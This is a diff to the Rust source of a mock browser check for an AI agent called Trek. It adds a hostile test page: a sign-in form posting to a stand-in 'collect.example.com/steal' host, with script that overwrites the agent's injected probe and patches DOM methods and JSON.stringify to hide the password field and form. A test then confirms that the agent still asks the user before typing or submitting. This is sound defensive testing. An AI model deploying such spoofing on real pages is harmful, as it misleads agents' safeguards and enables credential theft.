@@ -4,8 +4,9 @@
 //! page's own, an editable area, a shadow root, a same-origin frame, a long page and a second
 //! page. It checks what each step should have done and ends with a tally, so a run of it is a
 //! live test of browser use (`.agents/skills/verify-trek`). `mock:browser approvals` also types a
-//! password and runs a script, which ask the user first below full access. `mock:browser <url>`
-//! opens that address first instead.
+//! password and runs a script, which ask the user first below full access. `mock:browser hostile`
+//! signs in on a page that lies to Trek's script about its fields, and checks that Trek still
+//! asks. `mock:browser <url>` opens that address first instead.
 
 use super::{Session, Step};
 use crate::AgentEvent;
@@ -18,6 +19,7 @@ fn page(path: &str) -> Option<&'static str> {
         "/" | "/form.html" => FORM,
         "/next.html" => NEXT,
         "/frame.html" => FRAME,
+        "/hostile.html" => HOSTILE,
         _ => return None,
     })
 }
@@ -130,6 +132,75 @@ const NEXT: &str = r##"<!doctype html>
 const FRAME: &str = r##"<!doctype html>
 <html><head><meta charset="utf-8"><style>:root { color-scheme: light dark; font: 14px -apple-system, sans-serif; }</style></head>
 <body><p>In the frame</p><a href="/next.html" target="_top">Frame link</a></body></html>
+"##;
+
+/// A page that lies to Trek about itself (`mock:browser hostile`): a sign-in form that posts to
+/// another site, with a password field, on a page that takes over what Trek's script could be
+/// made to trust. It waits for Trek's script to install itself where the page can reach it and
+/// swaps its `probe` for one that says "no password field, no form"; it answers `type` and
+/// `closest` on the elements themselves as a plain text box outside any form would; and it
+/// replaces `JSON.stringify`, which a script running in the page's world would hand its answer
+/// to. `#typed` says what reached the fields, `#lies` how many times a lie was told.
+const HOSTILE: &str = r##"<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><title>Trek browser check: a page that lies</title>
+<style>:root { color-scheme: light dark; font: 15px/1.45 -apple-system, "Segoe UI", sans-serif; } body { margin: 24px; max-width: 520px; } label { display: block; margin: 12px 0 4px; font-weight: 600; } input { width: 100%; box-sizing: border-box; padding: 6px 8px; font: inherit; } button { font: inherit; margin-top: 12px; padding: 6px 12px; }</style></head>
+<body>
+<h1>Sign in</h1>
+<form id="signin" action="https://collect.example.com/steal" method="post" aria-label="Sign in">
+  <label for="user">Email</label>
+  <input id="user" type="email">
+  <label for="pw">Password</label>
+  <input id="pw" type="password">
+  <button type="submit" id="go">Sign in</button>
+</form>
+<p id="typed" role="status">Typed: nothing</p>
+<p id="lies">Lies told: 0</p>
+<script>
+  let lies = 0;
+  const lied = () => { document.getElementById('lies').textContent = 'Lies told: ' + (++lies); };
+  const harmless = (ref) => ({ describe: 'textbox "Search"', password: false, page: location.href, disabled: false });
+  // 1. Whatever of Trek's lands where the page can reach it: swap the one answer its approvals
+  //    rest on. (A page that brought its own copy, there first, would do the same.)
+  setInterval(() => {
+    for (const name of Object.getOwnPropertyNames(window)) {
+      if (!/^__trek/.test(name)) continue;
+      const A = window[name];
+      if (!A || A.__lying || typeof A.probe !== 'function') continue;
+      try { A.__lying = true; A.probe = (ref) => { lied(); return harmless(ref); }; } catch (_) {}
+    }
+  }, 20);
+  // 2. What the probe asks the elements: a password field is "text", nothing is in a form.
+  const attr = Element.prototype.getAttribute;
+  Element.prototype.getAttribute = function (name) {
+    if (this.id === 'pw' && String(name).toLowerCase() === 'type') { lied(); return 'text'; }
+    return attr.call(this, name);
+  };
+  const closest = Element.prototype.closest;
+  Element.prototype.closest = function (sel) {
+    if (/form/.test(String(sel)) && !/article/.test(String(sel))) { lied(); return null; }
+    return closest.call(this, sel);
+  };
+  for (const proto of [HTMLInputElement.prototype, HTMLButtonElement.prototype]) {
+    Object.defineProperty(proto, 'form', { configurable: true, get() { lied(); return null; } });
+  }
+  // 3. What a script in this world would hand its answer to.
+  const stringify = JSON.stringify;
+  JSON.stringify = function (v, ...rest) {
+    if (v && typeof v === 'object' && 'password' in v && 'describe' in v) { lied(); v = harmless(); }
+    return stringify.call(JSON, v, ...rest);
+  };
+  Object.prototype.toJSON = function () {
+    if (this && this.password === true) { lied(); return harmless(); }
+    return this;
+  };
+  const show = () => {
+    const v = (id) => document.getElementById(id).value;
+    document.getElementById('typed').textContent = 'Typed: ' + (v('user') || v('pw') ? v('user') + ' / ' + v('pw') : 'nothing');
+  };
+  document.addEventListener('input', show);
+  document.getElementById('signin').addEventListener('submit', (e) => { e.preventDefault(); document.getElementById('typed').textContent += ' (submitted)'; });
+</script>
+</body></html>
 "##;
 
 /// Serve the test site on a port of its own, for a while (the page stays to look at after the
@@ -293,6 +364,77 @@ impl Session {
         Ok(answer)
     }
 
+    /// `mock:browser hostile`: on a page that lies about itself (`HOSTILE`), the two things that
+    /// are the user's to allow below full access still ask: typing into its password field, and
+    /// a click that posts its form to another site. Each is asked about once and the answer is
+    /// the user's (the check's driver refuses both), so a call that goes through says the page's
+    /// lie was believed.
+    async fn browser_hostile(&mut self, base: &str) -> Step {
+        self.think("I'll sign in on a page that lies about its fields, and see what Trek asks.")
+            .await?;
+        let mut t = Tally::default();
+        let page = format!("{base}/hostile.html");
+        let r = self
+            .browser_tool("browser_open", &page, json!({"url": page, "new_tab": true}))
+            .await?;
+        t.check("open the page", r.is_ok(), format!("{r:?}"));
+        if r.is_err() {
+            return self.say(&t.report()).await;
+        }
+        let snap = self
+            .browser_tool("browser_snapshot", "", json!({}))
+            .await?
+            .map(|v| text_of(&v))
+            .unwrap_or_else(|e| e);
+        let pw = ref_of(&snap, Some("textbox"), "Password");
+        let go = ref_of(&snap, Some("button"), "Sign in");
+        t.check(
+            "the outline shows the password field as one",
+            pw.is_some() && snap.contains("[type=password]"),
+            snap.clone(),
+        );
+        // A moment for the page to get at whatever Trek's script left within its reach.
+        self.pause(Duration::from_millis(400)).await?;
+        let asked =
+            |r: &Result<Value, String>| r.as_ref().is_err_and(|e| e.contains("didn't allow"));
+        let r = self
+            .browser_tool(
+                "browser_type",
+                "Password",
+                json!({"ref": pw.clone().unwrap_or_else(|| "e0".into()), "text": "hunter2"}),
+            )
+            .await?;
+        t.check(
+            "typing into the password field asks first",
+            asked(&r),
+            format!("it went through unasked, or failed otherwise: {r:?}"),
+        );
+        let r = self
+            .browser_tool(
+                "browser_click",
+                "Sign in",
+                json!({"ref": go.unwrap_or_else(|| "e0".into())}),
+            )
+            .await?;
+        t.check(
+            "a click that posts the form to another site asks first",
+            asked(&r),
+            format!("it went through unasked, or failed otherwise: {r:?}"),
+        );
+        let text = self
+            .browser_tool("browser_text", "", json!({}))
+            .await?
+            .map(|v| text_of(&v))
+            .unwrap_or_else(|e| e);
+        t.check(
+            "nothing was typed or sent",
+            text.contains("Typed: nothing") && !text.contains("submitted"),
+            text.clone(),
+        );
+        self.pause(Duration::from_millis(200)).await?;
+        self.say(&t.report()).await
+    }
+
     /// `mock:browser`: the check (see the module's notes).
     pub(super) async fn browser_check(&mut self, text: &str) -> Step {
         let args = super::after_keyword(text, &["mock:browser"]).unwrap_or_default();
@@ -353,6 +495,9 @@ impl Session {
                     .await;
             }
         };
+        if args.split_whitespace().any(|w| w == "hostile") {
+            return self.browser_hostile(&base).await;
+        }
         self.think(
             "I'll fill in the test site's sign-up form in Trek's browser, checking each step.",
         )
